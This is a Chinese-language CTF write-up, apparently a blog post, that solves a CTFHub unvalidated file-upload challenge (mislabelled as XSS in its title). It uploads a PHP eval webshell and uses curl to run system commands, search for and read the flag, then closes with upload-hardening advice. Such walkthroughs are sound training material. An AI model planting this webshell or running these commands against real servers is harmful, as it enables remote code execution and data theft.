---
title: CTFHub XSS 无验证
date: 2026-10-19
categories: CTFHub XSS
tags: CTFHub XSS
---
# 题目:  CTFHub XSS 无验证

## 题目描述
打开题目页面，界面非常简洁：
一个文件选择按钮 Filename: 选择文件
一个 Submit 上传按钮
页面功能： 允许用户上传任意文件到服务器。
题目名为“无验证”意味着：
服务器端没有任何文件类型、后缀名、内容的校验，而且不会对上传的文件名做任何修改（不像“无限制”会追加 .txt）。
攻击思路： 直接上传 PHP 木马，访问解析，执行命令拿 flag。                                                                                                                                                                                                                           ## 解题思路
### 漏洞原理
文件上传漏洞的本质是：服务器允许上传可执行脚本，且脚本能被 Web 服务器解析执行。
既然这道题“无验证”，那攻击链最简单直接：
写 PHP 木马 → 上传 → 访问触发解析 → 执行系统命令 → 找到 flag

## 解题步骤
1. 编写 PHP 木马
本地新建文件 shell.php，内容如下：
'<?php @eval($_POST['cmd']); ?>'

代码解释
| 部分 | 说明 |
| :--- | :--- |
| `<?php ... ?>` | PHP 代码块 |
| `@eval(...)` | 执行括号里的字符串作为 PHP 代码，`@` 抑制报错 |
| `$_POST['cmd']` | 接收 POST 请求中名为 `cmd` 的参数 |

2. 上传木马
(1) 在题目页面点击 选择文件，选中 shell.php。
(2) 点击 Submit 上传。
返回结果：
上传文件相对路径
upload/shell.php
成功！ 没有任何 .txt 追加，文件被原样保存

3. 访问木马验证解析
在浏览器访问：
http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php
结果：页面空白。
说明： PHP 代码被服务器解析并执行了（如果没解析，会显示源码或者下载文件）。

4. 用 curl 执行命令
打开 CMD（Windows）或终端（Mac/Linux），执行：
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('ls');"
返回结果：
shell.php
index.php
...
说明木马已经可以执行系统命令了。

5. 全盘搜索 flag 文件
bash
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('find / -name *flag* 2>/dev/null');"
返回结果：
/var/www/html/flag_xxxxxxxx.php

6. 读取 flag
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('cat /var/www/html/flag_xxxxxxxx.php');"
返回结果：
ctfhub{d20b0bfa77e476850d4dfab0}

## 踩坑指南
1. 木马文件编码问题
表现： 用记事本编辑 shell.php，保存后变成 shell.php.txt。
原因： Windows 默认隐藏扩展名，你没看到真正的后缀。
解决： 用 VS Code 或 Notepad++ 保存，选择“所有文件”类型，手动输入文件名。

2. 路径猜错
表现： 上传后不知道文件保存在哪里，访问 404。
原因： 页面没有直接显示路径，或者路径拼错了。
解决： 看页面响应，或者尝试常见路径 /upload/、/uploads/。

3. curl 报错
表现： 'curl' 不是内部或外部命令。
原因： 老版本 Windows 未自带 curl。
解决： 用 PowerShell 替代，或者安装 curl。

4. find 命令权限报错
表现： find / -name *flag* 返回大量 Permission denied。
原因： 服务器大量目录无权限访问。
解决： 加 2>/dev/null 丢弃错误输出。

## 知识点总结
1. 文件上传漏洞核心要点
|知识点|说明|
| :--- | :--- |
|上传点|表单上传 接口上传|
|解析点|Web 服务器解析 PHP 脚本|
|利用链|上传木马 → 访问解析 → 执行命令|

2. WebShell
php
<?php @eval($_POST['cmd']); ?>
|部分|作用|
| :--- | :--- |
|@|抑制报错，防止暴露路径|
|eval|执行传入的 PHP 代码|
|$_POST['cmd']|获取 POST 请求里的 cmd 参数|

curl 命令
|命令|说明|
| :--- | :--- |
|curl -X POST URL -d "cmd=system('ls');"|执行 ls|
|curl -X POST URL -d "cmd=system('cat /flag');"|读取 flag|
|curl -X POST URL -d "cmd=system('find / -name *flag* 2>/dev/null');"|全盘搜索 flag|

## 防御建议
白名单校验：只允许 .jpg、.png 等安全后缀。
重命名文件：上传后使用随机文件名，避免攻击者访问。
禁止脚本执行：上传目录禁止解析 PHP 脚本。
校验 MIME 和文件头：不只依赖后缀，检查文件内容。
隔离存储：上传文件放在独立服务器，与网站代码隔离。
